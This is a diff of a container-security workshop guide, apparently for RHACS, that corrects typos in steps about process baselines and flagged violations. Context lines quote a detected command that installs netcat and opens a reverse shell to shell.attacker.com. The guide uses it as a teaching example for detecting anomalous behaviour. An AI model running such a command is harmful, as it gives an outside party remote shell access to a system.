@@ -151,7 +151,7 @@ image::03-risk-05.png[link=self, window=blank, width=100%]
 
 This tab displays all the running processes in the container. You can see that a baseline of processes has already been established, and a few violations of that baseline have been detected. The baseline is a list of the processes currently running, and alerts are triggered if RHACS detects new processes not included in the baseline.
 
-If you scroll to the bottom of the page, you can remove these processes from the baseline by clicking the - sign. Once locked in, you can craft alerts for anomloies and non-baseline activity. 
+If you scroll to the bottom of the page, you can remove these processes from the baseline by clicking the - sign. Once locked in, you can craft alerts for anomalies and non-baseline activity. 
 
 [start=6]
 . Click the drop-down arrow next to `/bin/bash` to reveal the specific context that triggered this violation
@@ -163,7 +163,7 @@ image::03-risk-06.png[link=self, window=blank, width=100%]
 
 `-c /usr/bin/sudo /usr/bin/apt-get -y install netcat; /usr/bin/sudo /bin/nc shell.attacker.com 9001 -e /bin/bash`.
 
-> Does this qualify as anamoulous behavior? is this behavior normal in a contatiner?
+> Does this qualify as anamoulous behavior? is this behavior normal in a container?
 
 [start=8]
 . Click the *View Graph* in the header bar to call up the *Event Timeline*.
